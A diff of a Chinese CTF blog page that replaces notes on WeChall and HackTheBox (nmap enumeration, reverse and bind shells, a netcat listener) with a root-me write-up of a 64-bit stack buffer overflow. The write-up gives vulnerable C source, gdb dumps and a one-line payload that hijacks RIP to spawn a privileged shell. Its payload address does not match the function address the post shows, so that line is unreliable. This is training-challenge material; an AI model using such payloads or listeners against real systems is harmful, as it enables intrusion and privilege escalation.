@@ -26,21 +26,21 @@
     var CONFIG = {"hostname":"finsenty54.github.io","root":"/","scheme":"Mist","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
 
-  <meta name="description" content="wechall register_globalsregister_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量http:&#x2F;&#x2F;1.1.1.1&#x2F;report.asp?id&#x3D;123&amp;kehu&#x3D;222login[0]&#x3D;admin 直接login&#x3D;admin 只取第一第二个字符  hacktheboxinvite challenge 浏览器console">
+  <meta name="description" content="ELF x64 - Stack buffer overflow - basicgdb 内 查看函数 info functions 0x0000000000401152  callMeMaybe 0x0000000000401193  main">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF入门 WECALL4+hackthebox-REVERSE">
-<meta property="og:url" content="http://finsenty54.github.io/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/index.html">
+<meta property="og:title" content="Stack buffer overflow - basic">
+<meta property="og:url" content="http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/index.html">
 <meta property="og:site_name" content="FINSENTY54">
-<meta property="og:description" content="wechall register_globalsregister_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量http:&#x2F;&#x2F;1.1.1.1&#x2F;report.asp?id&#x3D;123&amp;kehu&#x3D;222login[0]&#x3D;admin 直接login&#x3D;admin 只取第一第二个字符  hacktheboxinvite challenge 浏览器console">
+<meta property="og:description" content="ELF x64 - Stack buffer overflow - basicgdb 内 查看函数 info functions 0x0000000000401152  callMeMaybe 0x0000000000401193  main">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-07-11T02:37:31.000Z">
-<meta property="article:modified_time" content="2020-10-31T08:53:12.100Z">
+<meta property="article:published_time" content="2020-11-24T13:29:57.000Z">
+<meta property="article:modified_time" content="2020-11-24T13:31:11.316Z">
 <meta property="article:author" content="finsenty54">
-<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://finsenty54.github.io/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/">
+<link rel="canonical" href="http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/">
 
 
 <script class="page-configurations">
@@ -53,7 +53,7 @@
   };
 </script>
 
-  <title>CTF入门 WECALL4+hackthebox-REVERSE | FINSENTY54</title>
+  <title>Stack buffer overflow - basic | FINSENTY54</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-135283153-1"></script>
     <script>
@@ -229,7 +229,7 @@
 
       <!--noindex-->
       <section class="post-toc-wrap sidebar-panel">
-          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#wechall-register-globals"><span class="nav-number">1.</span> <span class="nav-text">wechall register_globals</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hackthebox"><span class="nav-number">2.</span> <span class="nav-text">hackthebox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hackthebox-%E2%80%93-Enumeration"><span class="nav-number">3.</span> <span class="nav-text">hackthebox – Enumeration</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#A-reverse-shell"><span class="nav-number">4.</span> <span class="nav-text">A reverse shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bind-shell"><span class="nav-number">5.</span> <span class="nav-text">Bind shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ollydbg"><span class="nav-number">6.</span> <span class="nav-text">ollydbg</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x64dbg"><span class="nav-number">7.</span> <span class="nav-text">x64dbg</span></a></li></ol></div>
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF-x64-Stack-buffer-overflow-basic"><span class="nav-number">1.</span> <span class="nav-text">ELF x64 - Stack buffer overflow - basic</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">主要思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.</span> <span class="nav-text">查看函数地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9Ca%E2%80%9D-280-%E2%80%9DB%E2%80%9D-6"><span class="nav-number">1.3.</span> <span class="nav-text">“a”*280+”B”*6</span></a></li></ol></li></ol></div>
       </section>
       <!--/noindex-->
 
@@ -308,7 +308,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/">
+    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://media.giphy.com/media/5xtDarHBDofiI04yE4U/giphy.gif">
@@ -324,7 +324,7 @@
     
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          CTF入门 WECALL4+hackthebox-REVERSE
+          Stack buffer overflow - basic
         </h1>
 
         <div class="post-meta-container">
@@ -334,19 +334,22 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2020-07-11 10:37:31" itemprop="dateCreated datePublished" datetime="2020-07-11T10:37:31+08:00">2020-07-11</time>
+      <time title="创建时间：2020-11-24 21:29:57 / 修改时间：21:31:11" itemprop="dateCreated datePublished" datetime="2020-11-24T21:29:57+08:00">2020-11-24</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-10-31 16:53:12" itemprop="dateModified" datetime="2020-10-31T16:53:12+08:00">2020-10-31</time>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
       </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/APP-system-in-root-me/" itemprop="url" rel="index"><span itemprop="name">APP system in root_me</span></a>
+        </span>
+    </span>
 
   
-    <span id="/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/" class="post-meta-item leancloud_visitors" data-flag-title="CTF入门 WECALL4+hackthebox-REVERSE" title="阅读次数">
+    <span id="/2020/11/24/Stack-buffer-overflow-basic/" class="post-meta-item leancloud_visitors" data-flag-title="Stack buffer overflow - basic" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -361,8 +364,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/" itemprop="commentCount"></span>
+    <a title="valine" href="/2020/11/24/Stack-buffer-overflow-basic/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/24/Stack-buffer-overflow-basic/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -374,14 +377,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.5k</span>
+      <span>3.3k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>3 分钟</span>
     </span>
 </div>
 
@@ -392,23 +395,80 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h4 id="wechall-register-globals"><a href="#wechall-register-globals" class="headerlink" title="wechall register_globals"></a>wechall register_globals</h4><p>register_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量<br><a target="_blank" rel="noopener" href="http://1.1.1.1/report.asp?id=123&amp;kehu=222">http://1.1.1.1/report.asp?id=123&amp;kehu=222</a><br>login[0]=admin 直接login=admin 只取第一第二个字符</p>
-<hr>
-<h4 id="hackthebox"><a href="#hackthebox" class="headerlink" title="hackthebox"></a>hackthebox</h4><p>invite challenge 浏览器console 下运行函数 加（）<br>curl -X POST https://…</p>
+        <h2 id="ELF-x64-Stack-buffer-overflow-basic"><a href="#ELF-x64-Stack-buffer-overflow-basic" class="headerlink" title="ELF x64 - Stack buffer overflow - basic"></a>ELF x64 - Stack buffer overflow - basic</h2><p><em>gdb 内 查看函数</em></p>
+<p><code>info functions</code></p>
+<pre><code>0x0000000000401152  callMeMaybe
+0x0000000000401193  main</code></pre>
 <a id="more"></a>
 <hr>
-<h4 id="hackthebox-–-Enumeration"><a href="#hackthebox-–-Enumeration" class="headerlink" title="hackthebox – Enumeration"></a>hackthebox – Enumeration</h4><p>ports=$(nmap -p- –min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d ‘/‘ -f 1 | tr ‘\n’ ‘,’ | sed s/,$//)<br>nmap -sC -sV -p$ports 10.10.10.27</p>
-<p>command 1 | command 2 把第一个命令command 1执行的结果作为command 2的输入传给command 2<br>-T4 可以加快执行速度<br>-p- 扫描所有端口<br>-min-rate 1000 to request that Nmap send at least 1,000 packets per secondcut<br>cut Print selected parts of lines from each FILE to standard output.<br>-f 指定第一列 -d 指定列分隔符<br> tr 命令用于转换或删除文件中的字符 ‘\n’ 转换为‘，’<br>sed ‘s/regexp/replacement/flags’.<br>Its basic concept is simple: the s command attempts to match the pattern space against the supplied regular expression regexp; if the match is successful, then that portion of the pattern space which was matched is replaced with replacement.<br>regexp匹配成功后用replace替代</p>
-<p>select IS_SRVROLEMEMBER (‘sysadmin’)</p>
+<p>ret 后<br>会将rsp指向的内容压入RIP，转移程序执行流</p>
 <hr>
-<p>remote code execution (RCE)</p>
-<h4 id="A-reverse-shell"><a href="#A-reverse-shell" class="headerlink" title="A reverse shell"></a>A reverse shell</h4><p>is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.</p>
-<h4 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h4><p>Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server.</p>
+<p>题目源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callMeMaybe</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> len, i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <hr>
-<p>netcat<br>nc -lvnp 443 监听模式 443 外来请求</p>
+<h3 id="主要思路："><a href="#主要思路：" class="headerlink" title="主要思路："></a>主要思路：</h3><p><a target="_blank" rel="noopener" href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf">http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf</a><br>根据这篇文章<br>通过溢出来控制RIP，将其指向我们想要的函数</p>
+<ol>
+<li>先向buffer中输入字符，执行到<code>ret</code>时，查看<code>RSP</code>的值，确定需要多少位可以溢出到<code>RSP</code>位</li>
+<li>可以确定需要<code>0x110</code> 即<code>280</code>位，之后添加的字符就会输入进<code>RIP</code>中</li>
+<li>我们需要的是执行<code>callMeMaybe()</code>，所以将函数地址倒序添加进末尾（因为小端序）</li>
+</ol>
 <hr>
-<h4 id="ollydbg"><a href="#ollydbg" class="headerlink" title="ollydbg"></a>ollydbg</h4><p>显示当前EIP *<br>执行到光标位置 F4<br>F2 断点<br>CALL 把接下来的地址先压入栈<br>win 压入参数逆序 f(a,b) 先压b 后 a<br>test = and 不改变操作数值</p>
-<h4 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h4><p>file test.py</p>
+<h3 id="查看函数地址"><a href="#查看函数地址" class="headerlink" title="查看函数地址"></a>查看函数地址</h3><pre><code>[0x00401193]&gt; fs symbols;f
+0x00401000 23 sym._init
+0x00401070 42 entry0
+0x00401070 43 sym._start
+0x004010a0 1 sym._dl_relocate_static_pie
+0x004010b0 33 sym.deregister_tm_clones
+0x004010e0 49 sym.register_tm_clones
+0x00401120 33 entry.fini0
+0x00401120 0 sym.__do_global_dtors_aux
+0x00401150 2 entry.init0
+0x00401150 0 sym.frame_dummy
+0x00401152 65 sym.callMeMaybe
+0x00401193 103 main
+0x00401193 103 sym.main</code></pre>
+<h3 id="“a”-280-”B”-6"><a href="#“a”-280-”B”-6" class="headerlink" title="“a”*280+”B”*6"></a>“a”*280+”B”*6</h3><pre><code>gdb-peda$ x/290xb $rbp-0x110
+0x7fffffffdb80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdb88:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdb90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdb98:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdba0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdba8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbb0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbb8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbc0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbc8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbd0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbd8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbe0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbe8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbf0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbf8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc00:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc08:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc10:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc18:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc20:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc28:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc30:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc38:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc40:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc48:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc50:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc58:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc60:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc68:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc70:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc78:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc88:    0x61    0x61    0x61    0x61    0x1e    0x01    0x00    0x00
+0x7fffffffdc90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc98:    0x42    0x42    0x42    0x42    0x42    0x42    0x00    0x00
+0x7fffffffdca0:    0x88    0xdd</code></pre>
+<hr>
+<p>成功控制RIP<br>RSP: 0x7fffffffdc98 –&gt; 0x424242424242 (‘BBBBBB’)<br>Invalid $PC address: 0x424242424242</p>
+<p>最后的payload:<br><code>(python -c &#39;print &quot;A&quot; * 280  + &quot;\xe7\x05\x40\x00\x00\x00\x00\x00&quot;&#39; ; cat ) | ./ch35</code></p>
 
     </div>
 
@@ -426,7 +486,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://finsenty54.github.io/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/" title="CTF入门 WECALL4+hackthebox-REVERSE">http://finsenty54.github.io/2020/07/11/CTF入门 WECALL4+hackthebox-REVERSE/</a>
+      <a href="http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/" title="Stack buffer overflow - basic">http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -454,21 +514,18 @@
   </div>
 
           <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/" rel="prev" title="CTF入门 WECALL2-正则">
-                  <i class="fa fa-chevron-left"></i> CTF入门 WECALL2-正则
+                <a href="/2020/11/17/Format_string_bug_basic%201/" rel="prev" title="Format string bug basic 1">
+                  <i class="fa fa-chevron-left"></i> Format string bug basic 1
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/07/27/RUST%E5%AD%A6%E4%B9%A01/" rel="next" title="RUST学习1">
-                  RUST学习1 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -602,7 +659,7 @@ NexT.utils.loadComments('#valine-comments', () => {
   NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
     new Valine(Object.assign({
       el  : '#valine-comments',
-      path: "/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/",
+      path: "/2020/11/24/Stack-buffer-overflow-basic/",
     }, {"enable":true,"appId":"3uGsbMNvxiG0LkbyciDSaxmY-MdYXbMMI","appKey":"1dU1y3SudPaV6pdTET96j5M2","placeholder":"欢迎交流讨论...","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
     ));
   }, window.Valine);
